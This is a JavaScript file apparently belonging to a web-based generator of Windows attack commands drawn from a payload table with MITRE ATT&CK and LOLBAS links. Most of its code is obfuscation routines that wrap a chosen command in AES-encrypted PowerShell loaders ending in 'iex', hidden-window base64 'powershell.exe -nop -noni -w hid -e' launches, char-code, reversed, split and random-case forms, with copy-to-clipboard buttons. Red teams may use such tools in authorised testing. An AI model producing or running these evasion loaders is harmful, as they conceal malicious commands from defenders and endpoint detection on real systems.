function updateSelectBinElem(optPurpose) {
    let elemOptBin = document.getElementById('options_1_bin');
    // Clear child elements.
    elemOptBin.innerHTML = "";

    const menu = Object.keys(PAYLOADS[optPurpose]);

    // Add elements.
    for (i = 0; i < menu.length; i++) {
        const newElem = document.createElement('option');
        newElem.value = menu[i];
        newElem.textContent = menu[i];
        elemOptBin.appendChild(newElem);
    }
}

function toBase64(str) {
    return btoa(str);
}

function toBase64UTF16LE(str) {
    // Convert str to UTF-16LE
    const utf16leBytes = [];
    for (let i = 0; i < str.length; i++) {
        const code = str.charCodeAt(i);
        utf16leBytes.push(code & 0xFF);
        utf16leBytes.push((code >> 8) & 0xFF);
    }

    const byteStr = String.fromCodePoint.apply(null, utf16leBytes);
    return btoa(byteStr);
}

async function obfsAesCbc(payload, cli) {
    if (cli === 'Command Prompt') {
        return '# No available on Command Prompt';
    } else {
        const key = await window.crypto.subtle.generateKey(
            {
                name: "AES-CBC",
                length: 256,
            },
            true,
            ["encrypt", "decrypt"],
        );
        const iv = window.crypto.getRandomValues(new Uint8Array(16));
        const encrypted = await window.crypto.subtle.encrypt(
            {
                name: "AES-CBC",
                iv: iv,
            },
            key,
            new TextEncoder().encode(payload),
        );

        const keyArray = new Uint8Array(await window.crypto.subtle.exportKey('raw', key));

        const encPayloadBase64 = btoa(String.fromCharCode(...new Uint8Array(encrypted)));
        const keyBase64 = btoa(String.fromCharCode(...keyArray));
        const ivBase64 = btoa(String.fromCharCode(...iv));
        return `$encBytes = [Convert]::FromBase64String("${encPayloadBase64}");$aes = [System.Security.Cryptography.Aes]::Create();$aes.Key = $([Convert]::FromBase64String("${keyBase64}"));$aes.IV = $([Convert]::FromBase64String("${ivBase64}"));$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$decryptor = $aes.CreateDecryptor();$decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length);iex $([System.Text.Encoding]::UTF8.GetString($decBytes))`;
    }
}

async function obfsAesGcm(payload, cli) {
    if (cli === 'Command Prompt') {
        return '# No available on Command Prompt';
    } else {
        const key = await window.crypto.subtle.generateKey(
            {
                name: "AES-GCM",
                length: 256,
            },
            true,
            ["encrypt", "decrypt"],
        );
        const nonce = window.crypto.getRandomValues(new Uint8Array(12));
        const encrypted = await window.crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: nonce,
            },
            key,
            new TextEncoder().encode(payload),
        );

        const keyArray = new Uint8Array(await window.crypto.subtle.exportKey('raw', key));
        const authTag = new Uint8Array(encrypted.slice(-16));
        const encPayload = new Uint8Array(encrypted.slice(0, -16));

        const keyBase64 = btoa(String.fromCharCode(...keyArray));
        const nonceBase64 = btoa(String.fromCharCode(...nonce));
        const authTagBase64 = btoa(String.fromCharCode(...authTag));
        const encPayloadBase64 = btoa(String.fromCharCode(... new Uint8Array(encPayload)));
        return `$encPayload = [Convert]::FromBase64String("${encPayloadBase64}");$key = [Convert]::FromBase64String("${keyBase64}");$nonce = [Convert]::FromBase64String("${nonceBase64}");$authTag = [Convert]::FromBase64String("${authTagBase64}");$payload = New-Object byte[] ($encPayload.Length);$aes = [System.Security.Cryptography.AesGcm]::new($key);$aes.Decrypt($nonce, $encPayload, $authTag, $payload);iex $([System.Text.Encoding]::UTF8.GetString($payload))`;
    }
}

function obfsBase64(payload, cli) {
    if (cli === 'Command Prompt') {
        // return '# No available on Command Prompt';
        return `powershell.exe -nop -noni -w hid -e ${toBase64UTF16LE(payload)}`;
    } else {
        return `powershell.exe -nop -noni -w hid -e ${toBase64UTF16LE(payload)}`;
    }
}

function obfsBase64Python(payload, cli) {
    if (cli === 'Command Prompt') {
        return `# No available on Command Prompt`;
    } else {
        return `iex $(python3 -c "import base64;print(base64.b64decode('${toBase64(payload)}').decode())")`;
    }
}

function obfsDoubleQuotes(payload, cli) {
    const arr = payload.split(' ');
    const cmdArr = arr[0].split('');

    const min = 2;
    let randNum = Math.floor(Math.random() * ((cmdArr.length - min) / 2 + 1)) * 2 + min;
    randNum = randNum % 2 === 0 ? randNum : randNum + 1;

    for (i = 0; i < 2; i++) {
        const maxIdx = cmdArr.length;
        const randEvenIdx = Math.floor(Math.random() * (maxIdx / 2)) * 2 + 1;
        cmdArr.splice(randEvenIdx, 0, '"');
    }
    return `${cmdArr.join('')} ${arr.slice(1).join(' ')}`
}

function obfsMultibyte(payload, cli) {
    let unicodePayload = "";

    if (cli === 'Command Prompt') {
        return `# No available on Command Prompt`;
    } else {
        for (i = 0; i < payload.length; i++) {
            unicodePayload += '[char]0x' + payload.charCodeAt(i).toString(16).padStart(2, '0');
            if (i < payload.length - 1) {
                unicodePayload += ' + ';
            }
        }
        return `iex $(${unicodePayload})`;
    }
}

function obfsRandomCase(payload, cli) {
    return payload.split('').map(char => {
        return Math.random() < 0.5 ? char.toLowerCase() : char.toUpperCase();
    }).join('');
}

function obfsReverse(payload, cli) {
    if (cli === 'Command Prompt') {
        return '# No available on Command Prompt';
    } else {
        const reversedPayload = payload.split('').reverse().join('');
        return `$reversed = '${reversedPayload}'.ToCharArray();[Array]::Reverse($reversed);iex(-join $reversed)`;
    }
}

function obfsSplit(payload, cli) {
    chars = []
    for (i = 0; i < payload.length; i++) {
        if (payload[i] === ' ') {
            chars.push("' '");
        } else if (payload[i] == '\'' || payload[i] == '"') {
            chars.push("'\"'");
        }
        else {
            chars.push(`'${payload[i]}'`);
        }
    }
    const charsJoined = chars.join('+');
    if (cli === 'Command Prompt') {
        return '# No available on Command Prompt';
    } else {
        return `$cmd = [char[]](${charsJoined}) -Join '';Invoke-Expression $cmd`;
        // return `powershell.exe -nop -noni -w hid -c "$cmd = [char[]](${charsJoined}) -Join '';Invoke-Expression $cmd"`;
    }
}

async function obfs(payload, cli, optObfs) {
    switch (optObfs) {
        case 'AES-CBC':
            return await obfsAesCbc(payload, cli);
        case 'AES-GCM':
            return await obfsAesGcm(payload, cli);
        case 'Base64':
            return obfsBase64(payload, cli);
        case 'Base64 (Python)':
            return obfsBase64Python(payload, cli);
        case 'Double-Quotes':
            return obfsDoubleQuotes(payload, cli);
        case 'Multibyte':
            return obfsMultibyte(payload, cli);
        case 'Random Case':
            return obfsRandomCase(payload, cli);
        case 'Reverse':
            return obfsReverse(payload, cli);
        case 'Split':
            return obfsSplit(payload, cli);
        default:
            return payload;
    }
}

function genPayload1(optPurpose, optBin) {
    const target = PAYLOADS[optPurpose][optBin];
    let payload = target['cmd'];
    const cli = target['cli'];
    const adminRequired = target['adminRequired'];
    const mitre = target['mitre'];
    const lolbas = target['lolbas'];
    const desc = target['desc'];

    // Update the ATT&CK ID link element
    const elemMitreLink = document.getElementById('options_1_links_mitre');
    if (mitre) {
        elemMitreLink.href = mitre['url'];
        elemMitreLink.textContent = mitre['id'];
        elemMitreLink.style.display = 'inline';
    } else {
        elemMitreLink.style.display = 'none';
    }
    // Update the LOLBAS link element
    const elemLolbasLink = document.getElementById('options_1_links_lolbas');
    if (lolbas) {
        elemLolbasLink.href = lolbas;
        elemLolbasLink.textContent = 'LOLBAS';
        elemLolbasLink.style.display = 'inline';
    } else {
        elemLolbasLink.style.display = 'none';
    }
    // Update the desc element.
    const elemDesc = document.getElementById('desc_1_p');
    if (desc) {
        elemDesc.textContent = desc;
    } else {
        elemDesc.textContent = 'No additional information.';
    }
    // Update the display of the admin label element
    const elemAdmin = document.getElementById('payload_1_pre_labels_admin');
    elemAdmin.style.display = adminRequired ? 'inline' : 'none';
    // Update the display of the cli label element.
    const elemCli = document.getElementById('payload_1_pre_labels_cli');
    if (cli) {
        elemCli.style.display = 'inline';
        elemCli.textContent = 'Run on ' + cli;
    } else {
        elemCli.style.display = 'none';
    }
    // Update the payload element
    const elemCode = document.getElementById('payload_1_pre_code');
    elemCode.textContent = payload;
}

async function genPayload2() {
    const optPurpose = document.getElementById('options_1_purpose').value;
    const optBin = document.getElementById('options_1_bin').value;
    let payload = document.getElementById('payload_1_pre_code').innerText;
    const optObfs = document.getElementById('options_2_obfs').value;

    const target = PAYLOADS[optPurpose][optBin];
    const cli = target['cli'];
    const adminRequired = target['adminRequired'];
    const mitre = target['mitre'];

    payload = await obfs(payload, cli, optObfs);

    // Update the payload element
    const elemCode = document.getElementById('payload_2_pre_code');
    elemCode.textContent = payload;
    // Update the display of the admin label element
    const elemAdmin = document.getElementById('payload_2_pre_labels_admin');
    elemAdmin.style.display = adminRequired ? 'flex' : 'none';
    // Update the display of the cli label element.
    const elemCli = document.getElementById('payload_2_pre_labels_cli');
    if (cli) {
        elemCli.style.display = 'inline';
        elemCli.textContent = 'Run on ' + cli;
    } else {
        elemCli.style.display = 'none';
    }
}

async function update1() {
    const optPurpose = document.getElementById('options_1_purpose').value;
    const optBin = document.getElementById('options_1_bin').value;

    genPayload1(optPurpose, optBin);
    const optObfs = document.getElementById('options_2_obfs').value;
    await genPayload2(optObfs);
}

async function update2() {
    const optObfs = document.getElementById('options_2_obfs').value;
    await genPayload2(optObfs);
}

async function updatePurpose() {
    const optPurpose = document.getElementById('options_1_purpose').value;
    updateSelectBinElem(optPurpose);
    await update1();
}

function showPopup() {
    const popup = document.getElementById('copied-popup');
    popup.style.display = 'block';
    setTimeout(() => {
        popup.style.display = 'none';
    }, 3000);
}

function copy1() {
    const text = document.getElementById('payload_1_pre_code').innerText;
    navigator.clipboard.writeText(text).then(() => {
        showPopup();
    }).catch(err => {
        console.error("Failed to copy: ", err);
    });
}

function copy2() {
    const text = document.getElementById('payload_2_pre_code').innerText;
    navigator.clipboard.writeText(text).then(() => {
        showPopup();
    }).catch(err => {
        console.error("Failed to copy: ", err);
    });
}

updatePurpose();